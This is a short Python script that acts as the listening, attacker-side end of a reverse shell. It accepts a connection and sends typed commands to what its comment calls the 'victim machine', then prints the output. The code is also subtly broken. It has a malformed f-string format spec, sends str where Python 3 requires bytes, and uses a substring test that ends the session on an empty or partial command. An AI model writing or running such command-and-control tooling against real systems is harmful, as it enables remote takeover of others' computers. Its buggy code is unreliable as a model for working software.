import socket

IP = '127.0.0.1'
PORT = 12345
def connect():
    mysock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    mysock.bind((IP,PORT))
    mysock.listen(1)
    print(f'[*] Listening on {IP}:{PORT}')
    conn, addr = mysock.accept()
    print(f'[*] Accepted connection from {addr[0]:addr[1]}')
    #send command shell to victim machine
    while True:
        command = input('shell > ')
        if command in 'terminate':
            conn.send('terminate')
            conn.close()
            break
        else:
            conn.send(command)
            print(conn.recv(1024).decode())
def main():
    connect()

if __name__ == '__main__':
    main()
